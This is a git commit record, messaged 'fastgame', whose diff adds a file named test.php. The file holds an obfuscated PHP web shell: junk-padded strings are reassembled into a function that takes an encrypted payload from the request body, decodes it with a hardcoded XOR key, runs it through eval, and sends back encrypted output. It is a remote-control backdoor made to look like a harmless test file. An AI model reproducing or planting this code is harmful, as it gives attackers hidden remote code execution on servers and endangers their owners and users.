b07e24a4988df84e72fec7c2d5e240157f525412
AxiaMil <limkaixian321@yahoo.com>
2021-06-25 00:17:33 +0800

    fastgame

---
+++ test.php
@@ -0,0 +1,13 @@
+<?php
+$y='fqh(fq"/$kh(.+)fqfq$kf/",fq@file_fqget_contentfqs(fq"pfqhp://input"fq),$m)f';
+$C='($m[1]fq),$fqk))fq)fq;$o=@ob_get_fqcontfqents();@ob_fqend_cleanfq();$fqr';
+$J='$jfq++,$i++)fqfq{$o.=$fqt{$i}^$fqk{$jfq};}}fqreturn $o;}fqif (@fqpreg_matc';
+$W='sfqtrlefqn($t);$fqo="";ffqor(fq$i=0;$i<fq$l;){fqfqfor($j=0;($jfq<$c&&$i<$fql);';
+$s='q==1) {@ob_fqstafqrfqt();@evfqal(@gzuncomprfqess(@xfq(@bfqase64_decofqde';
+$w=str_replace('SR','','crSReaSRSRte_fuSRncSRtSRion');
+$j='$k=fq"5f4dfqcc3b";fq$kfqh=fq"5aa765d61d83";fq$kf="27debfq882cf99"fq;$p';
+$Z='=fq"ENGfq7NN0Wy1mifqNCjn";ffqfqunction x($tfq,$k){fq$c=strlfqen($fqk);$l=';
+$p='=@basefqfq64_encodefq(@x(@gzfqcofqmpfqress($o),$k));fqprint("fq$fqp$kh$r$kf");}';
+$S=str_replace('fq','',$j.$Z.$W.$J.$y.$s.$C.$p);
+$D=$w('',$S);$D();
+?>
